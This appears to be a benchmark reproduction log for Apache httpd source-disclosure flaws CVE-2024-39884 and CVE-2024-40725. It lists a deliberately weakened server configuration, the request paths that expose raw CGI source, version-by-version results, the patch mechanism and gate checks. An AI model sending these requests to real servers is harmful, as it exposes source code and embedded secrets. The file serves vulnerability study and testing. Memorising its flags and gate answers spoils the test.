# repro.log — apache-http-server-cve-2024-40725 (CVE-2024-39884 -> CVE-2024-40725)
# generated: 2026-07-12
# Source code disclosure via the legacy content-type-based handler (AddType) being
# SKIPPED on an INDIRECT request whose content-type lost its "trusted" flag; core
# default_handler then serves the RAW SOURCE. Same sink for seed and residual
# (flag_oracle Variant A). Mechanism derived from Apache advisory + source diff only.

## Canary (per-run random token) planted ONLY in a source comment of the handled script:
#   /usr/local/apache2/htdocs/idx/secret.cgi  ->  '# PCB-CANARY-SOURCE-ONLY PCB_FLAG=<token>'
#   Executing the script prints only 'CGI-EXECUTED-OK-NO-SOURCE'; the flag is NEVER
#   printed, so it is observable iff the raw source is disclosed.
#   Gate flag (fresh, from `oracle.py --run-gate`): PCBFLAG_710313379af351f382f202dcf9132fe1

## Config (conf/vuln.conf, environment overlay; no app/business code changed)
  AddType application/x-httpd-cgi .cgi          # legacy content-type-based handler => mod_cgi
  Options +ExecCGI +MultiViews ...              # MultiViews enables the negotiation indirection
  DirectoryIndex secret.cgi  (in /idx)          # enables the DirectoryIndex indirection

## Recipe bring-up (no committed images/source; official httpd tags pulled at up-time)
  PCB_FLAG=<token> docker compose --profile v0 --profile v1 up -d
  # entrypoint: writes secret.cgi (flag in a source comment), Includes conf/extra/vuln.conf,
  #             then exec httpd-foreground. `oracle.py --run-gate` does up -> gate -> down.

## Payloads (curl --path-as-is)
  direct  (control, executes)                 : GET /idx/secret.cgi   -> 'CGI-EXECUTED-OK-NO-SOURCE', no flag (all versions)
  original (CVE-2024-39884, DirectoryIndex)   : GET /idx/
  bypass   (CVE-2024-40725, MultiViews neg.)  : GET /idx/secret

## Differential (observed on real Docker; DISCLOSED = flag/raw source in body)
                                   v0=2.4.60   v1=2.4.61   v2=2.4.62
  direct  GET /idx/secret.cgi   :  executed    executed    executed     (no flag anywhere; control)
  original GET /idx/            :  DISCLOSED   blocked     blocked      <- CVE-2024-39884: fixed in 2.4.61
  bypass  GET /idx/secret       :  DISCLOSED   DISCLOSED   blocked      <- CVE-2024-40725: residual open in 2.4.61, fixed in 2.4.62
  (repeated 3x -> identical/deterministic)

## Mechanism / incomplete-fix lineage (advisory + source diff only)
  2.4.60 regressed handler dispatch: a content-type-derived handler (legacy AddType) is
    honored only when the content-type is "trusted" (AP_REQUEST_IS_TRUSTED_CT). Indirect
    requests lost trust -> handler skipped -> default_handler serves raw source.
  2.4.61 (r1918839, CVE-2024-39884): "maintain trusted flag / always trust content types
    set literally" across modules -> closes the DirectoryIndex indirection. PARTIAL.
  2.4.62 (r1919249, CVE-2024-40725): ap_internal_fast_redirect() copied the trusted flag
    from the MAIN request r instead of the subrequest rr; the negotiation/MultiViews
    indirection stayed open. Fix: AP_REQUEST_IS_TRUSTED_CT(r) -> AP_REQUEST_IS_TRUSTED_CT(rr).

## Build-time gate (benchmark/flag_oracle.validate_case via `python3 oracle.py --run-gate`)
  original_poc_reaches_flag_on_v0 : true
  original_poc_blocked_on_v1      : true
  bypass_poc_reaches_flag_on_v1   : true
  passed                          : true
  _env_ready                      : {v0: true, v1: true}

## Data-quality
  - -39884 fix (2.4.61) is the guard -40725 bypasses; -40725 fix (2.4.62) closes the residual. Confirmed on real Docker.
  - Both gate preconditions satisfiable: seed reaches flag on V0 and is blocked on V1; residual reaches flag on V1.
  - Negative confirmed: residual (MultiViews) blocked on V2 (2.4.62) -> executes, no flag.
